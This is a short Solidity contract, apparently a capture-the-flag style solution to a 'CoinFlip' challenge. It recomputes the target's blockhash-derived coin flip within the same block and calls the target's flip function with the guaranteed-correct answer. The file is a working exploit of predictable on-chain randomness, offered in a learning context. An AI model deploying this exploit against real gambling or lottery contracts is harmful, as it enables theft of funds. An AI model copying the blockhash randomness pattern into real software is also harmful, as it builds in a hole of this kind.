// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 public consecutiveWins;
    uint256 private lastHash;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
    
    //mirror the flip function - instead of taking a guess just return the value of the side - then call the original flipcontract's flip method with the side calculated here on this block

    function hackContract() external {
        //get the flip value - copy pasta from og coinflip contract to get the same value

        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        //instance of flip contract deployed with the contractaddress

        CoinFlip originalContract = CoinFlip(contractAddress);

        //call flip with the "guess" that was already calculated 
        
        originalContract.flip(side);
    }
}
